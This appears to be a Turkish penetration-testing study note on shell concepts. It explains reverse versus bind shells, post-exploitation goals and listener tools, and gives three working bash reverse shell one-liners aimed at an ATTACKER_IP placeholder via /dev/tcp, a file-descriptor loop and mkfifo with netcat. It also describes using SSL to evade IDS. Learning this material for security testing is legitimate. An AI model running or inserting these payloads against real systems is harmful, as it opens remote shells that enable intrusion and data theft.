# Shell Temelleri ve Türleri


> [!info] Tanım
> **Shell (Kabuk):** Kullanıcının işletim sistemi çekirdeği (kernel) ile iletişim kurmasını ve komutları yürütmesini sağlayan arayüz yazılımıdır.

---

## 🎯 Bir Shell Oturumu ile Hedeflenen Faaliyetler

Bir sistem üzerinde yetkisiz veya yetkili bir shell elde edildiğinde gerçekleştirilen temel adımlar:

- **Uzaktan Sistem Kontrolü (Remote System Control):** Hedef sistem üzerinde uzaktan komut veya yazılım çalıştırma.
- **Yetki Yükseltme (Privilege Escalation):** İlk elde edilen erişim düşük yetkiliyse (kısıtlı kullanıcı), yönetici (`root` / `SYSTEM`) haklarına ulaşma yollarını araştırma.
- **Veri Sızdırma (Data Exfiltration):** Sistemdeki hassas dosyaları okuma, kopyalama ve dışarı aktarma.
- **Kalıcılık Sağlama (Persistence & Maintenance Access):** Yeniden başlatma sonrasında dahi erişimi sürdürmek için arka kapı (backdoor) bırakma veya kimlik bilgilerini toplama.
- **Sömürü Sonrası Faaliyetler (Post-Exploitation):** Hedefte amaca ulaşıldıktan sonra izleri örtme, arka planda gizli servis/hesap yapılandırma veya sistem bileşenlerini etkileme.
- **Yanal Hareket (Lateral Movement / Pivoting):** Ele geçirilen makineyi atlama noktası olarak kullanarak iç ağdaki diğer cihazlara erişim sağlama.

---

## 🔄 Shell Türleri

### 1. Reverse Shell (Ters Kabuk)
Bağlantı **hedef sistemden saldırganın dinleme yapan makinesine doğru** başlatılır. Hedef dışarıya doğru (outbound) bağlantı açtığı için çoğu güvenlik duvarı (firewall) ve NAT kuralını aşmada bind shell'e göre çok daha etkilidir.

```

[Hedef Sistem] ---------(Giden Bağlantı / Outbound)---------> [Dinleyici / Saldırgan]

```

### 2. Bind Shell (Bağlı Kabuk)
Hedef sistemde belirli bir port açılır ve sistem o port üzerinden gelen bağlantıyı bekler. Bağlantı kurulduğunda kabuk oturumu açılır.

> [!warning] Dezavantajı
> Hedef sistem üzerinde dışarıdan gelen (inbound) trafiği kısıtlayan güvenlik duvarları veya NAT yapıları varsa bağlantı engellenir. Ayrıca açık bir port dinlendiği için ağ izleme araçları tarafından tespit edilme olasılığı daha yüksektir.

```

[Saldırgan] ---------(Gelen Bağlantı / Inbound)---------> [Hedef Sistem (Açık Port)]

````

---

## 🛠️ Dinleme ve Yardımcı Araçlar

### Netcat (`nc`)
Ağ üzerinden veri okuma/yazma işlemleri için kullanılan temel ağ aracı.

```bash
nc -lvnp 443
````

- `-l`: Dinleme modunu açar (_Listen_).
    
- `-v`: Ayrıntılı çıktı üretir (_Verbose_).
    
- `-n`: DNS çözümlemesini devre dışı bırakır, yalnızca IP kullanır (_No DNS_).
    
- `-p 443`: Dinlenecek yerel portu belirler.
    

### Socat

İki yönlü veri akışı sağlayan, Netcat'e kıyasla daha gelişmiş soket aracı.

Bash

```
socat -d -d TCP-LISTEN:443 STDOUT
```

- `-d -d`: Detaylı hata/durum kayıtlarını (verbose logging) gösterir.
    
- `TCP-LISTEN:443`: 443 numaralı TCP portunu dinlemeye alır.
    
- `STDOUT`: Alınan veriyi standart çıktıya aktarır.
    

### Ncat

Nmap projesi kapsamında geliştirilmiş, SSL/TLS şifreleme desteği sunan gelişmiş Netcat türevi.

Bash

```
ncat --ssl -lvnp 4444
```

- `--ssl`: İletişimi şifreleyerek IDS/IPS sistemlerinin trafiği düz metin olarak incelemesini zorlaştırır.
    

### Rlwrap

Netcat gibi etkileşimli satır düzenleme (ok tuşları, geçmiş/history) yeteneği olmayan araçlara GNU Readline yeteneklerini kazandırır.

Bash

```
rlwrap nc -lvnp 443
```

## 💻 Yaygın Linux/Bash Reverse Shell Yöntemleri

### Standart Etkileşimli Bash

Bash

```
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

- `bash -i`: Etkileşimli bir kabuk başlatır.
    
- `>& /dev/tcp/ATTACKER_IP/443`: Standart çıktı (`stdout`) ve standart hatayı (`stderr`) belirtilen TCP soketine yönlendirir.
    
- `0>&1`: Standart girdiyi (`stdin`), standart çıktıya (yani ağ soketine) bağlar.
    

### Dosya Tanımlayıcı (File Descriptor) ile Okuma

Bash

```
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
```

- `exec 5<>...`: 5 numaralı dosya tanımlayıcısını belirtilen IP ve porta iki yönlü (okuma/yazma) bağlar.
    
- Döngü, soketten gelen satırları okur, çalıştırır ve çıktısını tekrar sokete yazar.
    

### İsimlendirilmiş Boru (Named Pipe - `mkfifo`)

Bash

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc ATTACKER_IP 443 > /tmp/f
```

- `/tmp/f` adında geçici bir FIFO (named pipe) dosyası oluşturur.
    
- Standart giriş ve çıkışları bu pipe ile Netcat bağlantısı arasında köprüleyerek iki yönlü etkileşim sağlar.